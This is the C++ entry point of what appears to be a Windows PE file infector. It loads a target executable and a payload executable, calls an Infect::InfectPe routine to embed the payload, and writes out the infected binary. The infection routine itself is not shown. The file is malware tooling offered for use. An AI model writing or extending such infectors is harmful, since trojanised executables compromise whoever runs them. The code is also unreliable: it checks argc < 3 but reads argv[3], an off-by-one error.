#include "pch.h"
#include "main.h"

int main(int argc, char* argv[])
{
    if (argc < 3) 
    {
        std::cerr << "Usage: <input_file> <payload_file> <output_file>\n";
        return 1;
    }

    const char* inputFile = argv[1];
    const char* payloadFile = argv[2];
    const char* outputFile = argv[3]; 

    std::cout << "Opening a input PE: " << inputFile << std::endl;
    if (!Infect::target.openFile(inputFile))
    {
        std::cerr << "Can't open input PE!\n";
        return 1;
    }

    std::cout << "Parsing headers of input PE: " << inputFile << std::endl;
    if (!Infect::target.parseHeaders())
    {
        std::cerr << "Can't parse headers of input PE!\n";
        return 1;
    }

    std::cout << "Opening a payload PE: " << payloadFile << std::endl;
    if (!Infect::payload.openFile(payloadFile))
    {
        std::cerr << "Can't open payload PE!\n";
        return 1;
    }

    std::cout << "Parsing headers of payload PE: " << payloadFile << std::endl;
    if (!Infect::payload.parseHeaders())
    {
        std::cerr << "Can't parse headers of payload PE!\n";
        return 1;
    }

    Infect::InfectPe();

    std::cout << "Saving output: " << outputFile << std::endl;
    Infect::target.saveFile(outputFile);

    return 0;
}